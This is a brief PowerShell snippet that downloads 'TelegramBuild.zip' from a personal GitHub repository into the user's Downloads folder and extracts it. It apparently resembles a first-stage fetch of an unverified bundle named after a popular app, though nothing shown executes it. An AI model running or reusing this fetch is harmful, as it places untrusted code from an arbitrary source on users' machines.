$Source = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.zip"  # <-- Link to your ZIP file
$DownloadPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.zip"
$ExtractPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild"  # Folder to unzip into
Invoke-WebRequest -Uri $Source -OutFile $DownloadPath
Start-Sleep -Seconds 4
Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
